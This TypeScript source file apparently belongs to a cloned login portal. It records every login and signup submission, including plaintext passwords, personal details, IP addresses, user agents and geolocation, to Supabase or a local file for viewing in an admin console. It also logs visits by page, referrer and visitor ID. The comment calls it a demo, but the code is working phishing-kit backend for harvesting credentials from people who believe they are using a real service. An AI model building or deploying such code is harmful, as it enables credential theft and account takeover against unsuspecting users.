import { randomUUID } from "node:crypto";
import { mkdir, readFile, rename, writeFile } from "node:fs/promises";
import path from "node:path";

import { getSupabaseAdmin } from "@/lib/supabase";
import type { LoginEvent, PortalEvent, PortalVisit, SignupEvent, VisitPage } from "@/types/portal";

export type { LoginEvent, PortalEvent, PortalVisit, SignupEvent } from "@/types/portal";

/**
 * Demo credential capture for the cloned portal.
 *
 * Two backends are supported:
 *
 * 1. Supabase (`SUPABASE_URL` + `SUPABASE_SERVICE_ROLE_KEY`) — used in
 *    production, where the app runs on Cloudflare and has no writable disk.
 * 2. A local JSON file — used for `npm run dev` when Supabase is not set up.
 *
 * Submissions are stored unencrypted on purpose: the `/admin` console exists to
 * show exactly what visitors typed. Never use this with real credentials.
 */

const DATA_DIR = path.join(process.cwd(), ".data");
const DATA_FILE = path.join(DATA_DIR, "portal-events.json");
const VISITS_FILE = path.join(DATA_DIR, "portal-visits.json");
const TABLE = "portal_events";
const VISITS_TABLE = "portal_visits";

/** Serialises local read-modify-write cycles so concurrent requests cannot drop rows. */
let queue: Promise<unknown> = Promise.resolve();

function withLock<T>(task: () => Promise<T>): Promise<T> {
  const run = queue.then(task, task);
  queue = run.then(
    () => undefined,
    () => undefined,
  );
  return run;
}

type EventRow = {
  id: string;
  kind: "login" | "signup";
  created_at: string;
  email: string;
  password: string;
  remember: boolean | null;
  first_name: string | null;
  last_name: string | null;
  country: string | null;
  phone_code: string | null;
  phone: string | null;
  account_type: string | null;
  company_name: string | null;
  agreements: number | null;
  ip: string | null;
  user_agent: string | null;
  geo_country: string | null;
  geo_city: string | null;
  geo_region: string | null;
};

function rowToEvent(row: EventRow): PortalEvent {
  const geo = {
    geoCountry: row.geo_country ?? "",
    geoCity: row.geo_city ?? "",
    geoRegion: row.geo_region ?? "",
  };

  if (row.kind === "login") {
    return {
      id: row.id,
      kind: "login",
      at: row.created_at,
      email: row.email,
      password: row.password,
      remember: row.remember === true,
      ip: row.ip ?? "",
      userAgent: row.user_agent ?? "",
      ...geo,
    };
  }

  return {
    id: row.id,
    kind: "signup",
    at: row.created_at,
    firstName: row.first_name ?? "",
    lastName: row.last_name ?? "",
    email: row.email,
    password: row.password,
    country: row.country ?? "",
    phoneCode: row.phone_code ?? "",
    phone: row.phone ?? "",
    accountType: row.account_type === "company" ? "company" : "individual",
    companyName: row.company_name ?? "",
    agreements: row.agreements ?? 0,
    ip: row.ip ?? "",
    userAgent: row.user_agent ?? "",
    ...geo,
  };
}

function eventToRow(event: PortalEvent): Omit<EventRow, "created_at"> & { created_at: string } {
  const base = {
    id: event.id,
    kind: event.kind,
    created_at: event.at,
    email: event.email,
    password: event.password,
    remember: null as boolean | null,
    first_name: null as string | null,
    last_name: null as string | null,
    country: null as string | null,
    phone_code: null as string | null,
    phone: null as string | null,
    account_type: null as string | null,
    company_name: null as string | null,
    agreements: null as number | null,
    ip: event.ip,
    user_agent: event.userAgent,
    geo_country: event.geoCountry ?? null,
    geo_city: event.geoCity ?? null,
    geo_region: event.geoRegion ?? null,
  };

  if (event.kind === "login") {
    return { ...base, remember: event.remember };
  }

  return {
    ...base,
    first_name: event.firstName,
    last_name: event.lastName,
    country: event.country,
    phone_code: event.phoneCode,
    phone: event.phone,
    account_type: event.accountType,
    company_name: event.companyName,
    agreements: event.agreements,
  };
}

async function readAllLocal(): Promise<PortalEvent[]> {
  try {
    const raw = await readFile(DATA_FILE, "utf8");
    const parsed: unknown = JSON.parse(raw);
    return Array.isArray(parsed) ? (parsed as PortalEvent[]) : [];
  } catch {
    return [];
  }
}

async function writeAllLocal(events: PortalEvent[]): Promise<void> {
  await mkdir(DATA_DIR, { recursive: true });
  const tempFile = `${DATA_FILE}.${process.pid}.tmp`;
  await writeFile(tempFile, `${JSON.stringify(events, null, 2)}\n`, "utf8");
  await rename(tempFile, DATA_FILE);
}

async function insertEvent(event: PortalEvent): Promise<void> {
  const supabase = getSupabaseAdmin();
  if (supabase) {
    const { error } = await supabase.from(TABLE).insert(eventToRow(event));
    if (error) throw new Error(`Supabase insert failed: ${error.message}`);
    return;
  }

  await withLock(async () => {
    const events = await readAllLocal();
    events.push(event);
    await writeAllLocal(events);
  });
}

function meta(request: Request) {
  return visitMeta(request);
}

export async function recordLogin(
  request: Request,
  input: { email: string; password: string; remember: boolean },
): Promise<LoginEvent> {
  const metaInfo = meta(request);
  const event: LoginEvent = {
    id: randomUUID(),
    kind: "login",
    at: new Date().toISOString(),
    email: input.email,
    password: input.password,
    remember: input.remember,
    ip: metaInfo.ip,
    userAgent: metaInfo.userAgent,
    geoCountry: metaInfo.country,
    geoCity: metaInfo.city,
    geoRegion: metaInfo.region,
  };
  await insertEvent(event);
  return event;
}

export async function recordSignup(
  request: Request,
  input: Omit<
    SignupEvent,
    "id" | "kind" | "at" | "ip" | "userAgent" | "geoCountry" | "geoCity" | "geoRegion"
  >,
): Promise<SignupEvent> {
  const metaInfo = meta(request);
  const event: SignupEvent = {
    id: randomUUID(),
    kind: "signup",
    at: new Date().toISOString(),
    ...input,
    ip: metaInfo.ip,
    userAgent: metaInfo.userAgent,
    geoCountry: metaInfo.country,
    geoCity: metaInfo.city,
    geoRegion: metaInfo.region,
  };
  await insertEvent(event);
  return event;
}

export async function listEvents(): Promise<PortalEvent[]> {
  const supabase = getSupabaseAdmin();
  if (supabase) {
    const { data, error } = await supabase
      .from(TABLE)
      .select("*")
      .order("created_at", { ascending: false });
    if (error) throw new Error(`Supabase select failed: ${error.message}`);
    return ((data ?? []) as EventRow[]).map(rowToEvent);
  }

  const events = await readAllLocal();
  return events.sort((a, b) => b.at.localeCompare(a.at));
}

export async function clearEvents(): Promise<number> {
  const supabase = getSupabaseAdmin();
  if (supabase) {
    const { count } = await supabase
      .from(TABLE)
      .select("id", { count: "exact", head: true });
    const { error } = await supabase
      .from(TABLE)
      .delete()
      .gte("created_at", "1970-01-01T00:00:00Z");
    if (error) throw new Error(`Supabase delete failed: ${error.message}`);
    return count ?? 0;
  }

  return withLock(async () => {
    const events = await readAllLocal();
    await writeAllLocal([]);
    return events.length;
  });
}

/* -------------------------------------------------------------------------- */
/* Visits                                                                     */
/* -------------------------------------------------------------------------- */

type VisitRow = {
  id: string;
  created_at: string;
  path: string;
  page: VisitPage;
  referrer: string | null;
  country: string | null;
  city: string | null;
  region: string | null;
  timezone: string | null;
  ip: string | null;
  user_agent: string | null;
  visitor_id: string | null;
};

/** Maps a URL path to the coarse buckets the admin console reports on. */
export function classifyPage(pathname: string): VisitPage {
  const path = pathname.toLowerCase();
  if (path === "/" || path === "") return "home";
  if (path.startsWith("/login")) return "login";
  if (path.startsWith("/live_signup") || path.startsWith("/register") || path.startsWith("/signup")) {
    return "signup";
  }
  return "other";
}

function rowToVisit(row: VisitRow): PortalVisit {
  return {
    id: row.id,
    at: row.created_at,
    path: row.path,
    page: row.page,
    referrer: row.referrer ?? "",
    country: row.country ?? "",
    city: row.city ?? "",
    region: row.region ?? "",
    timezone: row.timezone ?? "",
    ip: row.ip ?? "",
    userAgent: row.user_agent ?? "",
    visitorId: row.visitor_id ?? "",
  };
}

function visitToRow(visit: PortalVisit): Omit<VisitRow, "created_at"> & { created_at: string } {
  return {
    id: visit.id,
    created_at: visit.at,
    path: visit.path,
    page: visit.page,
    referrer: visit.referrer || null,
    country: visit.country || null,
    city: visit.city || null,
    region: visit.region || null,
    timezone: visit.timezone || null,
    ip: visit.ip || null,
    user_agent: visit.userAgent || null,
    visitor_id: visit.visitorId || null,
  };
}

async function readVisitsLocal(): Promise<PortalVisit[]> {
  try {
    const raw = await readFile(VISITS_FILE, "utf8");
    const parsed: unknown = JSON.parse(raw);
    return Array.isArray(parsed) ? (parsed as PortalVisit[]) : [];
  } catch {
    return [];
  }
}

async function writeVisitsLocal(visits: PortalVisit[]): Promise<void> {
  await mkdir(DATA_DIR, { recursive: true });
  const tempFile = `${VISITS_FILE}.${process.pid}.tmp`;
  await writeFile(tempFile, `${JSON.stringify(visits, null, 2)}\n`, "utf8");
  await rename(tempFile, VISITS_FILE);
}

type CloudflareRequestMeta = {
  country?: string;
  city?: string;
  region?: string;
  timezone?: string;
};

/** Geo/meta from Cloudflare's `request.cf`, with header fallbacks. */
function visitMeta(request: Request) {
  const headers = request.headers;
  const cf = (request as Request & { cf?: CloudflareRequestMeta }).cf ?? {};

  const ip =
    [
      headers.get("cf-connecting-ip"),
      headers.get("x-real-ip"),
      headers.get("x-forwarded-for")?.split(",")[0],
    ]
      .map((value) => value?.trim())
      .find(Boolean) || "127.0.0.1";

  const country = (cf.country ?? headers.get("cf-ipcountry") ?? "").trim().toUpperCase();
  const flagged = country === "XX" || country === "T1";

  return {
    ip,
    country: flagged ? "" : country,
    city: (cf.city ?? "").trim(),
    region: (cf.region ?? "").trim(),
    timezone: (cf.timezone ?? "").trim(),
    userAgent: headers.get("user-agent") ?? "",
  };
}

export async function recordVisit(
  request: Request,
  input: { path: string; page: VisitPage; referrer: string; visitorId: string },
): Promise<PortalVisit> {
  const visit: PortalVisit = {
    id: randomUUID(),
    at: new Date().toISOString(),
    path: input.path.slice(0, 512),
    page: input.page,
    referrer: input.referrer.slice(0, 512),
    visitorId: input.visitorId.slice(0, 64),
    ...visitMeta(request),
  };

  const supabase = getSupabaseAdmin();
  if (supabase) {
    const { error } = await supabase.from(VISITS_TABLE).insert(visitToRow(visit));
    if (error) throw new Error(`Supabase visit insert failed: ${error.message}`);
    return visit;
  }

  await withLock(async () => {
    const visits = await readVisitsLocal();
    visits.push(visit);
    await writeVisitsLocal(visits);
  });
  return visit;
}

export async function listVisits(): Promise<PortalVisit[]> {
  const supabase = getSupabaseAdmin();
  if (supabase) {
    const { data, error } = await supabase
      .from(VISITS_TABLE)
      .select("*")
      .order("created_at", { ascending: false })
      .limit(5000);
    if (error) throw new Error(`Supabase visit select failed: ${error.message}`);
    return ((data ?? []) as VisitRow[]).map(rowToVisit);
  }

  const visits = await readVisitsLocal();
  return visits.sort((a, b) => b.at.localeCompare(a.at)).slice(0, 5000);
}
